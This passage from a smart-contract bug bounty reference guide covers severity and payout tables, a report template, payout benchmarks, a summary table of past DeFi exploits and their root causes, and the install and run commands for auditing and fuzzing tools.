  - Known issues from prior audit reports (unless escalation)
  - Bugs requiring admin/privileged access (unless owner compromise explicitly in scope)
```

### Severity v2.3 Quick Reference

| Severity | Smart Contract Criteria | Payout Range |
|---|---|---|
| Critical | Direct theft of user funds (> $1K) | 10% of TVL, up to max |
| Critical | Permanent freezing of funds | 10% of TVL, up to max |
| Critical | Minting of unbacked assets | 10% of TVL, up to max |
| High | Temporary freezing of funds | 5% of TVL |
| High | Theft of unclaimed yield | 5% of TVL |
| Medium | Smart contract doesn't perform intended function | Fixed amount |
| Low | Contract fails under specific conditions | Fixed amount |

### Report Format Template
```
Title: [Protocol] — [Bug Class]: [Brief Description of Impact]

Severity: Critical / High / Medium / Low

Summary:
[2-3 sentences: what is broken, what an attacker can do, estimated impact in USD]

Vulnerability Details:
[Root cause with code snippet. Contract name + function name + line number]

Impact:
[What the attacker gains. Dollar amount or % of TVL if quantifiable]

Proof of Concept:
[Foundry test file — full runnable code]

Recommended Fix:
[Specific code change, 1-5 lines]

References:
[Any similar bugs, prior audit reports, EIP references]
```

---

## PAYOUT BENCHMARKS 2024-2025

| Bug Class | Typical Range | Record |
|---|---|---|
| Access Control | $50K–$15M | $950K (ZeroLend) |
| Flash Loan / Oracle | $50K–$5M | $1M (Balancer) |
| Reentrancy | $50K–$3M | $1M (Penpie, pre-exploit) |
| ZK Verifier Bypass | $50K–$10M | $10M (Wormhole) |
| Signature Replay | $5K–$500K | $2.2M (Polygon MRC20) |
| ERC4626 Inflation | $50K–$500K | Varies |
| Proxy / Upgrade | $50K–$10M | $10M (Wormhole) |

---

## NOTABLE EXPLOITS REFERENCE

| Protocol | Amount | Root Cause |
|---|---|---|
| Wormhole | $320M | Uninitialized UUPS proxy + missing signer check |
| Ronin Bridge | $625M | Validator key compromise (5/9 threshold) |
| Nomad | $200M | Merkle root initialized to 0x0 → any message valid |
| Beanstalk | $182M | Flash loan governance vote — no timelock |
| Curve | $70M | Read-only reentrancy in view function during callback |
| Mango | $117M | Oracle price manipulation via thin order book |
| Cetus (Sui) | $223M | Integer arithmetic overflow in AMM math |
| Loopscale | $5.8M | Oracle price rounding exploit |
| ResupplyFi | $9.8M | Rounding direction in vault share math |

---

## TOOLS REFERENCE

### Static Analysis
```bash
# Slither — Trail of Bits, 90+ detectors
pip install slither-analyzer
slither . --exclude-low --filter-paths "test|lib|node_modules"
slither . --detect reentrancy-eth,unprotected-upgrade,arbitrary-send-eth

# Aderyn — Cyfrin Rust-based, fast
cargo install aderyn
aderyn . --output report.md

# Mythril — symbolic execution
pip install mythril
myth analyze contracts/Token.sol
```

### Fuzzing
```bash
# Echidna — property-based fuzzer
docker pull trailofbits/echidna
echidna . --contract TestContract --config echidna.yaml

# Medusa
go install github.com/crytic/medusa@latest
medusa fuzz

# Halmos — symbolic execution (Foundry-native)
pip install halmos
halmos --contract VaultTest
```

### On-Chain Investigation
- **DeFiHackLabs:** PoC reproductions of real exploits → https://github.com/SunWeb3Sec/DeFiHackLabs
- **Phalcon Fork:** Visualize transaction execution trace
- **Tenderly:** Simulate transactions, fork state
- **Cast:** `cast call`, `cast storage`, `cast run` for on-chain inspection

### Audit Contest Platforms
- **Immunefi** — private + public, largest payouts
- **Code4rena** — competitive audits, wardens system
- **Sherlock** — judging + coverage model
- **Cantina** — invite-only high-value
- **Hats Finance** — ongoing bug bounties

